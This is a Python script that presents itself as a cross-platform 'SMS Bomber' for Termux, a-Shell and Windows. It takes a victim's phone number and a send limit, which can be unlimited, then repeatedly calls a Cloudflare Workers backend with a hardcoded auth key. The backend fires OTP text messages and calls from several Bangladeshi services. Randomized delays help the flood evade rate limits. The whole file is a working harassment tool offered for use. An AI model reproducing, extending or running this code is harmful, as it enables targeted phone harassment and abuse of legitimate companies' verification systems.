import json
import asyncio
import aiohttp
import random
import string
import os
import sys
import logging
from datetime import datetime
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Colors for terminal
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White

# Cloudflare Backend Configuration
CF_BACKEND_URL = "https://bomber-v2-backend.nafisfuhad26.workers.dev"
CF_SECRET_KEY = "BOMBER_V2_SECURE_KEY_X9Y8Z7W6V5"
OFFICIAL_USER_AGENT = "BomberV2-Official-Client"

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║ {Y}   ____  __  __ ____    ____   ___  __  __ ____  _____ ____  {C}║
║ {Y}  / ___||  \/  / ___|  | __ ) / _ \|  \/  | | __ )| ____|  _ \ {C}║
║ {Y}  \___ \| |\/| \___ \  |  _ \| | | | |\/| | |  _ \| _| | |_) |{C}║
║ {Y}   ___) | |  | |___) | | |_) | |_| | |  | | | |_) | |___|  _ < {C}║
║ {Y}  |____/|_|  |_|____/  |____/ \___/|_|  |_| |____/|_____|_| \_\{C}║
║                                                              ║
║ {W}      Cross-Platform SMS Bomber (iOS, Android, Windows)      {C}║
║ {W}           Created for: a-Shell, Termux, Windows             {C}║
║ {G}           Security: Session, Smart Retry, Log, Jitter       {C}║
║ {P}           Engine: Asyncio & Aiohttp (High Speed)            {C}║
╚══════════════════════════════════════════════════════════════╝
    """)

class AsyncBomber:
    def __init__(self, target, limit, mode='sms', stop_event=None):
        self.target = target
        self.limit = limit
        self.mode = mode
        self.sent = 0
        self.failed = 0
        self.running = True
        self.stop_event = stop_event if stop_event else asyncio.Event()
        self.log_file = f"bombing_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.session = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()

    async def log_event(self, api_name, success, status_code=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        status = "SUCCESS" if success else "FAILED"
        log_entry = f"[{timestamp}] {api_name:15} | {status:7} | Code: {status_code}\n"

        with open(self.log_file, "a") as f:
            f.write(log_entry)

        if success:
            self.sent += 1
            color = G
            icon = "✓"
        else:
            self.failed += 1
            color = R
            icon = "✗"

        limit_str = "∞" if self.limit == 0 else str(self.limit)
        logging.info(f"{color}[{icon}] {timestamp} | {api_name:15} | {status:7} | Sent: {self.sent}/{limit_str}{W}")

    async def call_cf_api(self, endpoint, api_name):
        url = f"{CF_BACKEND_URL}{endpoint}"
        headers = {
            "X-Bomber-Auth": CF_SECRET_KEY,
            "User-Agent": OFFICIAL_USER_AGENT,
            "Content-Type": "application/json"
        }
        data = {"target": self.target}
        try:
            async with self.session.post(url, json=data, headers=headers, timeout=15) as res:
                success = res.status in [200, 201]
                await self.log_event(api_name, success, res.status)
                return success
        except Exception as e:
            await self.log_event(api_name, False, f"Error: {str(e)}")
            return False

    # API Endpoints
    async def api_chaldal(self): return await self.call_cf_api("/api/sms/chaldal", "Chaldal OTP")
    async def api_pathao(self): return await self.call_cf_api("/api/sms/pathao", "Pathao OTP")
    async def api_sharetrip(self): return await self.call_cf_api("/api/sms/sharetrip", "ShareTrip OTP")
    async def api_shohoz(self): return await self.call_cf_api("/api/sms/shohoz", "Shohoz OTP")
    async def api_robi_call(self): return await self.call_cf_api("/api/call/robi", "Robi Call OTP")

    async def bomb_task(self):
        apis = [self.api_chaldal, self.api_pathao, self.api_sharetrip, self.api_shohoz, self.api_robi_call]
        while self.running and not self.stop_event.is_set():
            if self.limit != 0 and self.sent >= self.limit:
                self.running = False
                break
            
            api = random.choice(apis)
            await api()
            await asyncio.sleep(random.uniform(0.5, 2.0))

async def main():
    clear()
    banner()
    target = input(f"{C}[?] Enter Target Number: {W}")
    limit = int(input(f"{C}[?] Enter Limit (0 for Unlimited): {W}") or 0)
    
    print(f"\n{Y}[*] Starting Secure Bombing on {target}...{W}")
    print(f"{Y}[*] Press Ctrl+C to stop.\n{W}")
    
    stop_event = asyncio.Event()
    async with AsyncBomber(target, limit, stop_event=stop_event) as bomber:
        try:
            await bomber.bomb_task()
        except KeyboardInterrupt:
            bomber.running = False
            print(f"\n{R}[!] Stopping...{W}")

    print(f"\n{G}[✓] Done! Total Sent: {bomber.sent}{W}")

if __name__ == "__main__":
    asyncio.run(main())
